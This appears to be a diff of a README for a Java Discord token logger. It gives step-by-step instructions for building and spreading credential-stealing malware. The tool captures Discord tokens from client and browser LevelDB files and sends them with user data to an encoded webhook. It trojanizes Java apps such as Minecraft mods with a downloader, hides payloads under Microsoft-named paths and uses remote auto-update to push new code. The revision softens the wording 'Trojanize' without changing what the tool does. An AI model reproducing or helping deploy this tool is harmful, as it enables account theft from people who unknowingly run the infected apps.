@@ -1,61 +1,62 @@
 Simple Discord token logging utility written in Java.
 # Features
- - Log tokens saved by Discord clients in LevelDB files
- - Gather user info through the token and send it to a webhook in an embed of your choice
- - Auto-update functionality
+ - Capture tokens saved by Discord clients and browsers in LevelDB files
+ - Retrieve user information using said tokens and seamlessly send it to a designated webhook in an easily customizable embed format with placeholders
+ - Deployment through a lightweight downloader that operates independently of external dependencies
+ - Enhance and adapt the application's functionality as needed through auto-update capabilities
 # Requirements
  - Java 11+
  - Jackson
  - JNA-Platform
 # Usage
-1. *(Optional)* Change the path the Updater will be downloaded to in **ClientTokenGrabber.java**
+1. *(Optional)* Modify the download path for the Updater in the **TokenLogger** class
     ```java
     public static final String UPDATER_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\ExampleUpdater.jar";
     ```
-2. Encode your webhook in Base64 for minimal security and paste it in **ClientTokenGrabber.java**
+2. Encode your webhook URL in Base64 and paste it into the **TokenLogger** class
     ```java
     public static final String WEBHOOK_URL = "YOUR BASE64 ENCODED WEBHOOK URL HERE";
     ```
-3. *(Optional)* Change the path the Application will be downloaded to in **Updater.java**
+3. *(Optional)* Adjust the download path for the Application in the **Updater** class
     ```java
     private static final String APP_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Example.jar";
     ```
-4. Host a file containing the version and download link to the main Application jar information just like in [/examples/Version Info](https://github.com/0x5d0/Discord-Client-Token-Logger/blob/master/examples/Version%20Info) (link should not be filled out yet)
+4. Host a file containing the version and download link to the main Application jar information just like in [/examples/Version Info](../blob/master/examples/Version%20Info) (the link should not be filled out yet)
     ```json
     {
-        "version": 1,
-        "link": ""
+        "version":1,
+        "link":""
     }
     ```
-5. Change the link in **UpdateHelper.java** to that
+5. Update the link in the **UpdateHelper** class to point to the version information file
     ```java
-    private static final String INFO_URL = "https://raw.githubusercontent.com/0x5d0/Discord-Client-Token-Logger/master/examples/Version%20Info";
+    private static final String INFO_URL = "https://raw.githubusercontent.com/0x5d0/Discord-Token-Logger/master/examples/Version%20Info";
     ```
-6. Compile the **Updater**
-7. Host the Updater jar just like in [/examples/Update.jar](https://github.com/0x5d0/Discord-Client-Token-Logger/blob/master/examples/Update.jar)
-8. Change the link in **ClientTokenGrabber.java** to that
+6. Build the **Updater**
+7. Host the Updater jar, following the example in [/examples/Updater.jar](../blob/master/examples/Update.jar)
+8. Update the link in the **TokenLogger** class to point to the hosted Updater jar
     ```java
-    public static final String UPDATER_URL = "https://github.com/0x5d0/Discord-Client-Token-Logger/blob/master/examples/Update.jar";
+    public static final String UPDATER_URL = "https://github.com/0x5d0/Discord-Token-Logger/raw/master/examples/Updater.jar";
     ```
-9. Change the link in **Downloader.java** to that as well
+9. Update the link in the **Downloader** class as well
     ```java
-    private static final String DOWNLOAD_URL = "https://github.com/0x5d0/Discord-Client-Token-Logger/blob/master/examples/Update.jar";
+    private static final String DOWNLOAD_URL = "https://github.com/0x5d0/Discord-Token-Logger/raw/master/examples/Updater.jar";
     ```
-10. *(Optional)* Change the path the Updater will be downloaded to in **Downloader.java** (should be the same as step one)
+10. *(Optional)* Modify the download path for the Updater in the **Downloader** class (matching step one)
     ```java
     private static final String SAVE_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\ExampleUpdater.jar";
     ```
-11. Trojanize your preferred app (Minecraft mod/any Java app) with the Downloader source and compile it (uses no external libraries)
-12. Compile the **ClientTokenGrabber.java**
-13. Host the compiled ClientTokenGrabber jar just like in [/examples/Application.jar](https://github.com/0x5d0/Discord-Client-Token-Logger/blob/master/examples/Application.jar)
-14. Go back to step 4 and change the "link" field to where the ClientTokenGraber jar is hosted
+11.  Implement the Downloader source in your preferred Java application (such as a Minecraft mod or any Java app) and build it
+12. Build the **Application**
+13. Host the main Application jar, similar to [/examples/Application.jar](../blob/master/examples/Application.jar)
+14. Return to step four and update the "link" field in the version information file to point to the hosted Application jar
     ```json
     {
-        "version": 1,
-        "link": "https://raw.githubusercontent.com/0x5d0/Discord-Client-Token-Logger/master/examples/Update.jar"
+    "version":1,
+    "link":"https://github.com/0x5d0/Discord-Token-Logger/raw/master/examples/Application.jar"
     }
     ```
-15. Run the Downloader jar or the trojanized app and your Discord token and related user information will be sent to your webhook
+15. Run the Downloader or the Java application with the integrated downloader, and your Discord token and related user information will be automatically sent to your webhook.
 ## Auto-Update
 - ### Application
     To distribute updates to all instances of your application, you must first locate and update the version number in the **UpdateHelper** class to a higher value than the current one.This version number will help identify whether an update is available. You can then make the necessary changes to your main application and build it. Finally, host the new version and update the version information file to reflect these changes. This file serves as a reference for your application to determine whether an update is needed.
